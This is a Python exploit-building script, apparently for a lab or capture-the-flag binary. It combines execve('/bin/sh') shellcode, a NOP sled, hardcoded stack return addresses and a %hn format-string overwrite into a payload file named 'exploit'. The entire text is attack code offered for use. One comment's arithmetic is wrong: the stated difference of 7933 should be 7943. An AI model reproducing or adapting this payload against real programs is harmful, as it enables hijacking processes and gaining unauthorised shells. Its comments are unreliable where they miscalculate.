import struct

# Shellcode: execve("/bin/sh")
shellcode = (
    b"\x48\x31\xc0\x50"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x53\x48\x89\xe7\x50\x57\x48\x89\xe6"
    b"\xb0\x3b\x0f\x05"
)

# NOP sled before shellcode
nop_sled = b"\x90" * 100
buffer = nop_sled + shellcode
padding = b"A" * (200 - len(buffer))

# ✅ Use correct return address locations
retaddr_low  = struct.pack("<Q", 0x7fffffffdc48)
retaddr_high = struct.pack("<Q", 0x7fffffffdc4a)

# ✅ Jump target = start of buffer (confirmed from GDB)
jmp_addr = 0x7fffffffe0f8

low = jmp_addr & 0xffff       # 0xe0f8 = 57592
high = (jmp_addr >> 16) & 0xffff  # 0xffff = 65535
diff = (high - low) & 0xffff      # 7933

# Format string overwrite
fmt = f"%{low}x%13$hn%{diff}x%14$hn".encode()

# Final payload
payload = buffer + padding + retaddr_low + retaddr_high + fmt

# Write to file
with open("exploit", "wb") as f:
    f.write(payload)

print("[+] Final working exploit written to 'exploit'")

